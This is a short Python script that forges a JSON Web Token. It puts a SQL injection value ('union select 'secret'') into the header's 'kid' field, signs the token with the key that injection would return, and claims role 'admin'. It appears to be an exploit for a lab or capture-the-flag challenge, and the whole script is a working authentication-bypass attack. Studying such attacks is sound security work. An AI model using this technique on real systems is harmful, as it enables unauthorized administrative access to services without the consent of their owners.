import jwt

key = "secret"
header = {"alg":"HS256","typ":"JWT","kid":"2123 union select 'secret'"}
payload = {"sub":"1234567890","name":"John Doe","role":"admin"}
token = jwt.encode(payload, "secret", algorithm="HS256", headers = header)
print(token)